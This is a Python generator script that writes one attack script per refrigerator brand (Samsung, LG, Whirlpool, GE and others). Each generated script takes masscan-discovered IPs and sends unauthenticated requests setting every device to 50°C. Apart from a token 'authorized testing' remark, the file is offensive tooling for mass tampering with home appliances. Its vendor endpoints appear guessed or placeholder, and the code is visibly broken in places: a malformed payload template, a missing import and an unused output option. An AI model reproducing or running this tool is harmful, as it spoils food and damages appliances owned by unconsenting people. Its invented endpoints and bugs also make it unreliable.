#!/usr/bin/env python3
"""
generate_attack_files.py
------------------------
Generates per-model attack utilities for refrigerator IoT devices.
Each generated file is a self‑contained Python script that:
- Takes a list of target IPs (masscan output)
- Attempts to set the temperature to a configurable value
- Includes model‑specific endpoint, payload key, and optional auth placeholder
- Prints a short result per device

Usage:
    python3 generate_attack_files.py

The script writes one file per model (attack_<model>.py) into the current
directory (or a supplied output directory).

Edit the MODELS dict below to add new brands or update known endpoints.
"""

import argparse
import os
import sys
from pathlib import Path
from textwrap import dedent

# ---------------------------------------------------------------------------
# MODELS DEFINITION
# Each entry describes how to talk to a specific refrigerator brand.
# Keys: brand (used as filename prefix), endpoint_path, payload_key, method
#       (GET/POST/PUT), optional port, timeout, and a short description.
# ---------------------------------------------------------------------------
MODELS = {
    "samsung": {
        "brand": "samsung",
        "endpoint_path": "/smartthings/api/v1/devices/{ip}/commands/temperature",
        "payload_key": "targetTemperature",
        "method": "POST",
        "port": 80,
        "timeout": 5,
        "description": "Samsung ThinQ/SmartThings endpoint; sets temperature via JSON payload.",
    },
    "lg": {
        "brand": "lg",
        "endpoint_path": "/api/thinq/device/{ip}/setTemperature",
        "payload_key": "temperature",
        "method": "POST",
        "port": 80,
        "timeout": 5,
        "description": "LG ThinQ API; simple temperature set command.",
    },
    "whirlpool": {
        "brand": "whirlpool",
        "endpoint_path": "/api/whirlpool/control/temperature",
        "payload_key": "temp",
        "method": "POST",
        "port": 80,
        "timeout": 5,
        "description": "Whirlpool IoT control endpoint; temp set as JSON.",
    },
    "ge": {
        "brand": "ge",
        "endpoint_path": "/api/geappliances/v1/temperature",
        "payload_key": "value",
        "method": "POST",
        "port": 80,
        "timeout": 5,
        "description": "GE Appliances API; temperature value as numeric payload.",
    },
    "fount": {
        "brand": "fount",
        "endpoint_path": "/api/device/temperature",
        "payload_key": "temp",
        "method": "POST",
        "port": 80,
        "timeout": 5,
        "description": "Fount brand endpoint; placeholder for discovered API.",
    },
    "generic": {
        "brand": "generic",
        "endpoint_path": "/api/temperature",
        "payload_key": "set",
        "method": "POST",
        "port": 80,
        "timeout": 5,
        "description": "Generic fallback endpoint for unknown devices.",
    },
}


def generate_attack_file(model: dict) -> Path:
    """Write a per-model attack script to the output directory."""
    brand = model["brand"]
    endpoint = model["endpoint_path"]
    payload_key = model["payload_key"]
    method = model["method"]
    port = model["port"]
    timeout = model["timeout"]
    description = model["description"]

    # filename: attack_<brand>.py
    filename = f"attack_{brand}.py"
    filepath = Path(filename)

    # Template for the generated script (dedent removes leading indentation)
    template = dedent(
        f"""\
        #!/usr/bin/env python3
        \"\"\"
        {description}
        ----------------------------
        Attack utility for {brand} refrigerator IoT devices.

        Usage:
            python3 attack_{brand}.py targets.txt

        where `targets.txt` contains one IP per line (masscan output).

        Safety notes:
        - Only HTTP/HTTPS; no raw socket brute‑force.
        - No authentication unless you add your own token.
        - Designed for authorized testing on your own LAN.
        \"\"\"

        import json
        import requests
        import sys
        import time

        # Default port for the model (override per IP if needed)
        PORT = {port}
        TIMEOUT = {timeout}

        def build_url(ip: str, path: str) -> str:
            return f\"http://{ip}:{PORT}{path.replace('{{ip}}', ip)}\"

        def set_temperature(ip: str, value: float) -> tuple[bool, str]:
            url = build_url(ip, \"{endpoint}\")
            payload = {{{{payload_key}}}: value}
            try:
                r = requests.post(url, json=payload, timeout=TIMEOUT)
                if r.status_code in (200, 201, 204):
                    return True, f\"{brand.capitalize()} set temperature to {{value:.1f}}°C\"
            except Exception:
                pass
            return False, \"Could not set temperature\"

        def main() -> None:
            if len(sys.argv) < 2:
                print(\"Usage: python3 attack_{{brand}}.py targets.txt\")
                sys.exit(1)
            targets_file = Path(sys.argv[1])
            if not targets_file.is_file():
                print(f\"Targets file not found: {{targets_file}}\")
                sys.exit(1)

            with targets_file.open() as f:
                for idx, line in enumerate(f, start=1):
                    line = line.strip()
                    if not line:
                        continue
                    print(f\"[{{idx}}] {{line}} – setting to 50°C…\", end=\" \")
                    success, msg = set_temperature(line, 50.0)
                    if success:
                        print(msg)
                    else:
                        print(\"FAILED\")
                    time.sleep(1.0)

        if __name__ == \"__main__\":
            main()
        """
    ).strip()

    filepath.write_text(template)
    print(f"Generated: {filepath}")
    return filepath


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate per-model attack files for refrigerator IoT devices"
    )
    parser.add_argument(
        "-o",
        "--output-dir",
        type=Path,
        default=Path.cwd(),
        help="Directory to write the attack files (default: current dir)",
    )
    args = parser.parse_args()

    for model in MODELS.values():
        generate_attack_file(model)


if __name__ == "__main__":
    main()
